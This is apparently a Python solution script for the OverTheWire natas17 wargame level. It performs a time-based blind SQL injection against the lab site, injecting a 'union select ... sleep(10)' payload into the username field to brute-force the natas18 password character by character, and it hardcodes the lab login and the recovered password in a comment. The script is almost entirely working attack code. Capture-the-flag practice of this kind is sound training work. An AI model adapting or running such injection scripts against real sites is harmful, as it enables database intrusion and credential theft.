import requests
import string
import time

url = 'http://natas17.natas.labs.overthewire.org/'
auth = requests.auth.HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

pwd = ''

for i in range(1,33):
    for j in string.ascii_letters+string.digits:
        start = int(time.time())
        data = {'username':'" union select (case when (username="natas18" and binary substring(password,1,' + str(i) + ')="' + (pwd+j) + '") then sleep(10) else sleep(0) end),null from users-- '}
        response = requests.post(url,auth=auth,data=data)
        end = int(time.time())

        if end-start >= 10:
            pwd += j
            print(pwd)
            break

# xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
